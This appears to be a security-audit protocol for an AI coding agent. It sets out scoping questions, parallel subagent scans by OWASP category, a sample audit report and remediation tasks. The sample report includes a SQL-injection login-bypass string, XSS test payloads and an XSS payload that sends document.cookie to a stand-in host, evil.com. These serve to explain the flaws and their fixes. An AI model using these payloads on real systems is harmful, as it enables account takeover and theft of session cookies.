# Security Audit Protocol

## Step 1: Security Scope Discovery (Ask 3-4 Questions)

**Don't audit blindly.** Understand the scope:

### Q1: Audit Scope
```
"What should I audit for security?

- **Specific feature/component?** (e.g., authentication, payment processing)
- **Entire application?** (comprehensive audit)
- **Known vulnerability?** (specific CVE or exploit)
- **Compliance check?** (OWASP Top 10, PCI-DSS, GDPR)
- **Code review?** (review new/changed code)

Please specify the scope."
```

### Q2: Threat Model
```
"What are you most concerned about?

Common threats:
- **Data breaches** (unauthorized access to sensitive data)
- **Authentication bypass** (login vulnerabilities)
- **Injection attacks** (SQL, XSS, command injection)
- **Access control** (unauthorized actions)
- **API security** (endpoint vulnerabilities)
- **Infrastructure** (server, network, cloud config)
- **Dependencies** (vulnerable packages)

Any specific concerns?"
```

### Q3: Sensitivity Level
```
"What sensitive data does the system handle?

- **Personal data** (names, emails, addresses)
- **Authentication credentials** (passwords, tokens)
- **Financial data** (credit cards, payment info)
- **Health information** (PHI, HIPAA-covered)
- **Business secrets** (proprietary data, API keys)

This determines audit depth and compliance requirements."
```

### Q4: Existing Security Measures (optional)
```
"What security measures are already in place?

- Authentication: [JWT / sessions / OAuth]
- Authorization: [RBAC / ACL / custom]
- Encryption: [at rest / in transit / both]
- Input validation: [present / absent]
- Security headers: [CSP, HSTS, etc.]
- Rate limiting: [yes / no]
- Logging/monitoring: [yes / no]

This helps me identify gaps."
```

---

## Step 2: Parallel Execution Strategy

After scope discovery, determine if parallel execution would improve audit efficiency:

**Parallelize audit if:**
- [ ] Comprehensive audit (entire application, not single feature)
- [ ] Multiple OWASP categories need coverage
- [ ] Codebase is large (> 10 files or > 1000 lines)
- [ ] Time-sensitive audit (need results quickly)

**Do NOT parallelize if:**
- [ ] Targeted vulnerability investigation (single CVE)
- [ ] Small codebase (< 5 files)
- [ ] Following up on specific known issue

**Reference:** parallel.md lines 82-95 for decision framework

### Multi-Domain Parallel Scanning

For comprehensive audits, use parallel domain scanning across OWASP categories:

**Execution pattern:**
```xml
<function_calls>
  <invoke name="Task">
    <parameter name="description">Scan for injection vulnerabilities (A03)</parameter>
    <parameter name="subagent_type">security</parameter>
    <parameter name="prompt">
      Scan the codebase at [paths] for injection vulnerabilities:
      - SQL injection (string concatenation in queries)
      - XSS (dangerouslySetInnerHTML, unsanitized HTML)
      - Command injection (shell command construction)

      For each finding:
      - Provide file path and line number
      - Show vulnerable code
      - Explain exploit scenario
      - Suggest fix with code example

      Use SECURITY-AUDIT.md template lines 99-145 for SQL injection,
      lines 147-210 for XSS.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Scan for authentication and authorization issues (A01, A07)</parameter>
    <parameter name="subagent_type">security</parameter>
    <parameter name="prompt">
      Scan authentication and authorization code at [paths]:
      - Endpoints without authentication checks
      - Weak password requirements
      - Missing rate limiting
      - Session management issues

      Use SECURITY-AUDIT.md template lines 267-340 for findings format.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Scan for sensitive data exposure (A02)</parameter>
    <parameter name="subagent_type">security</parameter>
    <parameter name="prompt">
      Scan for sensitive data exposure at [paths]:
      - Hardcoded secrets (API keys, passwords, tokens)
      - Excessive data in API responses
      - Unencrypted sensitive data

      Use SECURITY-AUDIT.md template lines 213-262 for hardcoded secrets.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Scan for security misconfiguration (A05)</parameter>
    <parameter name="subagent_type">security</parameter>
    <parameter name="prompt">
      Scan for security misconfiguration at [paths]:
      - Missing security headers (CSP, HSTS, X-Frame-Options)
      - CORS misconfiguration
      - Verbose error messages
      - Missing rate limiting

      Use SECURITY-AUDIT.md template lines 345-373 for findings format.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Scan for logging and monitoring failures (A09)</parameter>
    <parameter name="subagent_type">security</parameter>
    <parameter name="prompt">
      Scan for logging and monitoring gaps at [paths]:
      - Missing security event logging
      - No audit trail for authentication
      - Insufficient error tracking
      - Missing alerting mechanisms

      Document specific gaps and recommendations.
    </parameter>
  </invoke>
  <invoke name="Bash">
    <parameter name="command">npm audit --json</parameter>
    <parameter name="description">Check dependency vulnerabilities (A06)</parameter>
  </invoke>
</function_calls>
```

**After agents complete:** Consolidate findings into unified report, map to OWASP categories, prioritize by severity.

**Reference:** parallel.md lines 59-78 for parallel execution syntax, lines 110-115 for feature-based parallelization

### OWASP Top 10 Parallel Assessment

For detailed OWASP compliance audits, assess each category independently:

**Execution pattern:**
```xml
<function_calls>
  <invoke name="Task">
    <parameter name="description">Assess A01: Broken Access Control</parameter>
    <parameter name="subagent_type">security</parameter>
    <parameter name="prompt">
      Audit codebase at [paths] specifically for A01: Broken Access Control.

      Check for:
      - Missing authentication on endpoints
      - Inadequate authorization checks
      - Insecure direct object references
      - Privilege escalation vulnerabilities

      Rate: PASS / PARTIAL / FAIL with specific evidence and severity.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Assess A02: Cryptographic Failures</parameter>
    <parameter name="subagent_type">security</parameter>
    <parameter name="prompt">
      Audit codebase at [paths] specifically for A02: Cryptographic Failures.

      Check for:
      - Hardcoded secrets and credentials
      - Weak encryption algorithms
      - Missing encryption at rest/in transit
      - Improper key management

      Rate: PASS / PARTIAL / FAIL with specific evidence and severity.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Assess A03: Injection</parameter>
    <parameter name="subagent_type">security</parameter>
    <parameter name="prompt">
      Audit codebase at [paths] specifically for A03: Injection.

      Check for:
      - SQL injection vulnerabilities
      - XSS (reflected, stored, DOM-based)
      - Command injection
      - LDAP/XML/template injection

      Rate: PASS / PARTIAL / FAIL with specific evidence and severity.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Assess A04: Insecure Design</parameter>
    <parameter name="subagent_type">security</parameter>
    <parameter name="prompt">
      Audit codebase at [paths] specifically for A04: Insecure Design.

      Check for:
      - Missing rate limiting
      - Lack of security by design
      - Inadequate threat modeling
      - Missing security controls in architecture

      Rate: PASS / PARTIAL / FAIL with specific evidence and severity.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Assess A05: Security Misconfiguration</parameter>
    <parameter name="subagent_type">security</parameter>
    <parameter name="prompt">
      Audit codebase at [paths] specifically for A05: Security Misconfiguration.

      Check for:
      - Missing security headers
      - Default configurations
      - Verbose error messages
      - Unnecessary features enabled

      Rate: PASS / PARTIAL / FAIL with specific evidence and severity.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Assess A07: Auth & Session Failures</parameter>
    <parameter name="subagent_type">security</parameter>
    <parameter name="prompt">
      Audit codebase at [paths] specifically for A07: Auth & Session Failures.

      Check for:
      - Weak password requirements
      - Session fixation vulnerabilities
      - Missing session timeout
      - Insecure credential storage

      Rate: PASS / PARTIAL / FAIL with specific evidence and severity.
    </parameter>
  </invoke>
</function_calls>
```

**After agents complete:** Calculate overall OWASP score, create comprehensive assessment matrix.

**Reference:** parallel.md lines 103-108 for layer-based parallelization

---

## Step 3: Security Analysis

### Comprehensive Security Audit

```markdown
## Security Audit Report: [System/Component]

**Audit Date:** [Current date]
**Audited by:** [LLM model + version]
**Scope:** [Specific scope from discovery]
**Threat model:** [Primary concerns]

---

## Executive Summary

**Overall Security Posture:** [CRITICAL / POOR / FAIR / GOOD / EXCELLENT]

**Critical vulnerabilities found:** [N]
**High-risk issues:** [N]
**Medium-risk issues:** [N]
**Low-risk issues:** [N]

**Immediate actions required:** [Brief list of critical fixes]

---

## 🔴 CRITICAL Vulnerabilities (Fix Immediately)

### CVE-1: SQL Injection in User Login

**Severity:** CRITICAL (CVSS 9.8)
**Category:** Injection Attack (OWASP A03:2021)

**Location:** `src/auth/login.js:45`

**Vulnerable code:**
```javascript
// ⚠️ CRITICAL VULNERABILITY
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
const user = await db.query(query);
```

**Vulnerability:** Unsanitized user input directly concatenated into SQL query

**Exploit example:**
```javascript
// Attacker input:
email = "admin@example.com' OR '1'='1"
password = "anything' OR '1'='1"

// Results in:
SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1' AND password = 'anything' OR '1'='1'
// Always returns true → authentication bypass
```

**Impact:**
- Full database access
- Authentication bypass
- Data exfiltration
- Potential remote code execution

**Fix (HIGH PRIORITY):**
```javascript
// ✅ SECURE: Use parameterized queries
const query = 'SELECT * FROM users WHERE email = ? AND password = ?';
const user = await db.query(query, [email, hashedPassword]);
```

**Verification:**
```bash
# Test with SQLMap
sqlmap -u "http://localhost/api/login" --data "email=test&password=test" --batch
```

**References:**
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

---

### CVE-2: Stored Cross-Site Scripting (XSS)

**Severity:** CRITICAL (CVSS 8.7)
**Category:** XSS (OWASP A03:2021)

**Location:** `src/components/CommentDisplay.tsx:23`

**Vulnerable code:**
```javascript
// ⚠️ CRITICAL VULNERABILITY
function CommentDisplay({ comment }) {
  return <div dangerouslySetInnerHTML={{ __html: comment.text }} />;
}
```

**Vulnerability:** User-generated content rendered as raw HTML without sanitization

**Exploit example:**
```javascript
// Attacker submits comment:
comment.text = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)" />'

// When other users view the comment:
// - Malicious script executes
// - Steals session cookies
// - Sends to attacker's server
```

**Impact:**
- Session hijacking
- Account takeover
- Malware distribution
- Phishing attacks

**Fix (HIGH PRIORITY):**
```javascript
// ✅ SECURE: Sanitize HTML with DOMPurify
import DOMPurify from 'dompurify';

function CommentDisplay({ comment }) {
  const sanitized = DOMPurify.sanitize(comment.text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// Better: Use textContent for plain text
function CommentDisplay({ comment }) {
  return <div>{comment.text}</div>; // React escapes automatically
}
```

**Verification:**
```javascript
// Test with XSS payloads
const xssPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>'
];
// All should be rendered safely
```

---

### CVE-3: Hardcoded Secrets in Source Code

**Severity:** CRITICAL (CVSS 9.1)
**Category:** Sensitive Data Exposure (OWASP A02:2021)

**Location:** `src/config/database.js:5`

**Vulnerable code:**
```javascript
// ⚠️ CRITICAL VULNERABILITY
const DB_CONFIG = {
  host: 'prod-db.example.com',
  user: 'admin',
  password: 'P@ssw0rd123!', // Hardcoded password in source
  database: 'production'
};
```

**Impact:**
- Anyone with source code access has database credentials
- Credentials in git history (even if removed later)
- Potential full database compromise

**Fix (HIGH PRIORITY):**
```javascript
// ✅ SECURE: Use environment variables
const DB_CONFIG = {
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME
};

// .env file (add to .gitignore)
DB_HOST=prod-db.example.com
DB_USER=admin
DB_PASSWORD=<secure-password-from-vault>
DB_NAME=production
```

**Cleanup required:**
```bash
# Remove from git history
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch src/config/database.js" \
  --prune-empty --tag-name-filter cat -- --all

# Rotate compromised credentials immediately
```

---

## 🟠 HIGH Risk Issues (Fix Soon)

### Issue 1: Missing Authentication on API Endpoint

**Severity:** HIGH (CVSS 7.5)
**Location:** `src/api/users.js:67`

**Problem:**
```javascript
// No authentication check
app.get('/api/users/:id', async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user); // Exposes all user data
});
```

**Fix:**
```javascript
app.get('/api/users/:id', authenticateToken, async (req, res) => {
  // Only allow users to access their own data
  if (req.user.id !== req.params.id && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const user = await User.findById(req.params.id);
  res.json(user);
});
```

---

### Issue 2: Weak Password Requirements

**Severity:** HIGH (CVSS 7.2)
**Location:** `src/auth/validation.js:12`

**Problem:** Accepts weak passwords (min 6 characters, no complexity)

**Fix:**
```javascript
const passwordSchema = z.string()
  .min(12, 'Password must be at least 12 characters')
  .regex(/[A-Z]/, 'Must contain uppercase letter')
  .regex(/[a-z]/, 'Must contain lowercase letter')
  .regex(/[0-9]/, 'Must contain number')
  .regex(/[^A-Za-z0-9]/, 'Must contain special character');
```

---

### Issue 3: No Rate Limiting

**Severity:** HIGH (CVSS 7.0)
**Category:** Brute Force Vulnerability

**Problem:** No rate limiting on login endpoint

**Impact:**
- Brute force password attacks
- Account enumeration
- DDoS vulnerability

**Fix:**
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
});

app.post('/api/login', loginLimiter, loginHandler);
```

---

## 🟡 MEDIUM Risk Issues (Should Fix)

### Issue 1: Missing Security Headers

**Severity:** MEDIUM (CVSS 5.3)

**Missing headers:**
- `Content-Security-Policy`
- `X-Frame-Options`
- `X-Content-Type-Options`
- `Strict-Transport-Security`

**Fix:**
```javascript
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

---

### Issue 2: Excessive Data Exposure

**Severity:** MEDIUM (CVSS 5.0)
**Location:** `src/api/profile.js:34`

**Problem:** API returns unnecessary sensitive fields

```javascript
// Returns password hash, internal IDs, etc.
res.json(user);
```

**Fix:**
```javascript
// Only return necessary fields
res.json({
  id: user.id,
  name: user.name,
  email: user.email,
  avatar: user.avatar
  // Don't include: passwordHash, resetToken, internalId, etc.
});
```

---

## 🟢 LOW Risk Issues (Consider Fixing)

### Issue 1: Verbose Error Messages

**Problem:** Error messages expose implementation details

**Fix:** Generic error messages to users, detailed logs server-side

---

### Issue 2: No Security Logging

**Problem:** No audit trail for security events

**Fix:** Log authentication attempts, access to sensitive data, configuration changes

---

## ✅ Security Best Practices Found

**Good practices already in place:**
- ✓ HTTPS enforced
- ✓ Passwords hashed with bcrypt
- ✓ CORS configured appropriately
- ✓ JWT tokens expire after 1 hour
- ✓ Input validation on most endpoints

---

## 🔐 OWASP Top 10 (2021) Assessment

| Risk | Status | Notes |
|------|--------|-------|
| A01 Broken Access Control | 🔴 FAIL | Missing auth on endpoints |
| A02 Cryptographic Failures | 🔴 FAIL | Hardcoded secrets |
| A03 Injection | 🔴 FAIL | SQL injection vulnerability |
| A04 Insecure Design | 🟡 PARTIAL | Rate limiting missing |
| A05 Security Misconfiguration | 🟡 PARTIAL | Missing security headers |
| A06 Vulnerable Components | 🟢 PASS | Dependencies up to date |
| A07 Auth & Session Failures | 🟡 PARTIAL | Weak password policy |
| A08 Data Integrity Failures | 🟢 PASS | CSP helps prevent tampering |
| A09 Logging & Monitoring | 🔴 FAIL | No security logging |
| A10 Server-Side Request Forgery | 🟢 PASS | Not applicable |

**Overall OWASP Score:** 40/100 (POOR)

---

## 📋 Remediation Plan

### Immediate (Within 24 hours)
1. Fix SQL injection (CVE-1) - CRITICAL
2. Fix XSS vulnerability (CVE-2) - CRITICAL
3. Remove hardcoded secrets (CVE-3) - CRITICAL
4. Rotate compromised credentials

### Short-term (Within 1 week)
1. Add authentication to unprotected endpoints
2. Strengthen password requirements
3. Implement rate limiting
4. Add security headers

### Medium-term (Within 1 month)
1. Implement comprehensive security logging
2. Set up monitoring and alerting
3. Conduct penetration testing
4. Security training for team

---

## 🛡️ Security Hardening Checklist

### Authentication & Authorization
- [ ] Fix SQL injection in login
- [ ] Add authentication to all protected endpoints
- [ ] Implement proper authorization checks
- [ ] Strengthen password requirements
- [ ] Add rate limiting to prevent brute force
- [ ] Implement account lockout after failed attempts
- [ ] Add 2FA/MFA support

### Input Validation
- [ ] Sanitize all user inputs
- [ ] Fix XSS vulnerabilities
- [ ] Validate file uploads (type, size, content)
- [ ] Use parameterized queries everywhere

### Data Protection
- [ ] Remove hardcoded secrets
- [ ] Use environment variables for sensitive config
- [ ] Encrypt sensitive data at rest
- [ ] Use HTTPS everywhere (enforce)
- [ ] Minimize data exposure in API responses

### Security Headers
- [ ] Content-Security-Policy
- [ ] X-Frame-Options
- [ ] X-Content-Type-Options
- [ ] Strict-Transport-Security
- [ ] Referrer-Policy

### Monitoring & Logging
- [ ] Log all authentication attempts
- [ ] Log access to sensitive data
- [ ] Set up security alerting
- [ ] Implement SIEM integration

### Dependencies
- [ ] Audit npm packages for vulnerabilities
- [ ] Keep dependencies up to date
- [ ] Use Snyk/Dependabot for alerts

---

**Overall Assessment:** System has CRITICAL vulnerabilities requiring immediate attention. Recommend fixing critical issues before production deployment.

**Next steps:** Should I implement the critical fixes?
```

---

## Step 3: Parallel Remediation Strategy

For multiple independent vulnerabilities, parallelize fixes:

**Parallelize remediation if:**
- [ ] 3+ critical/high vulnerabilities
- [ ] Vulnerabilities are in different files
- [ ] Fixes are independent (no shared dependencies)

**Execution pattern:**
```xml
<function_calls>
  <invoke name="Task">
    <parameter name="description">Fix SQL injection in authentication</parameter>
    <parameter name="subagent_type">code</parameter>
    <parameter name="prompt">
      Fix SQL injection vulnerability in src/auth/login.js:45.

      Current vulnerable code:
      ```javascript
      const query = `SELECT * FROM users WHERE email = '${email}'`;
      ```

      Replace with parameterized query as shown in SECURITY-AUDIT.md lines 129-132.
      Test the fix works correctly.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Fix XSS in comment display component</parameter>
    <parameter name="subagent_type">code</parameter>
    <parameter name="prompt">
      Fix XSS vulnerability in src/components/CommentDisplay.tsx:23.

      Current vulnerable code:
      ```javascript
      return <div dangerouslySetInnerHTML={{ __html: comment.text }} />;
      ```

      Sanitize with DOMPurify as shown in SECURITY-AUDIT.md lines 182-197.
      Add test for XSS payload blocking.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Remove hardcoded database credentials</parameter>
    <parameter name="subagent_type">code</parameter>
    <parameter name="prompt">
      Remove hardcoded credentials from src/config/database.js:5.

      Replace with environment variables as shown in SECURITY-AUDIT.md lines 237-250.
      Create .env.example file with placeholder values.
      Update .gitignore to exclude .env files.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Add security headers with helmet</parameter>
    <parameter name="subagent_type">code</parameter>
    <parameter name="prompt">
      Add security headers to prevent common attacks.

      Install and configure helmet middleware as shown in SECURITY-AUDIT.md lines 356-372.
      Include CSP, HSTS, X-Frame-Options, and X-Content-Type-Options.
    </parameter>
  </invoke>
  <invoke name="Task">
    <parameter name="description">Implement rate limiting</parameter>
    <parameter name="subagent_type">code</parameter>
    <parameter name="prompt">
      Implement rate limiting on authentication endpoints.

      Use express-rate-limit as shown in SECURITY-AUDIT.md lines 328-338.
      Apply to login, registration, and password reset endpoints.
    </parameter>
  </invoke>
</function_calls>
```

**After fixes complete:** Run security tests to verify all vulnerabilities resolved, run npm audit, verify no new issues introduced.

**Reference:** parallel.md lines 110-115 for feature-based parallelization, lines 39-50 for optimal agent usage

---

## Step 4: Implementation

After approval, implement security fixes:

```markdown
## Security Fixes Implemented

### ✅ FIXED: SQL Injection (CVE-1)

**Changes:**
- Replaced string concatenation with parameterized queries
- Added input validation layer
- Implemented prepared statements

**Code changes:**
[Show before/after code]

**Testing:**
- ✅ SQLMap scan shows no vulnerabilities
- ✅ All unit tests passing
- ✅ Integration tests passing

---

### ✅ FIXED: XSS Vulnerability (CVE-2)

**Changes:**
- Added DOMPurify for HTML sanitization
- Removed dangerous `dangerouslySetInnerHTML` where possible
- Implemented Content Security Policy

**Testing:**
- ✅ XSS payload tests all blocked
- ✅ Legitimate HTML rendered correctly
- ✅ CSP headers verified

---

[Continue for each fix...]
```

---

## Quality Criteria

Security audit complete when:
- [ ] Full scope reviewed
- [ ] All OWASP Top 10 categories assessed
- [ ] Vulnerabilities categorized by severity
- [ ] Specific fixes provided with code examples
- [ ] CVSS scores calculated
- [ ] Remediation plan created
- [ ] Critical issues fixed (if implementing)
- [ ] Security testing performed
- [ ] Documentation updated

---
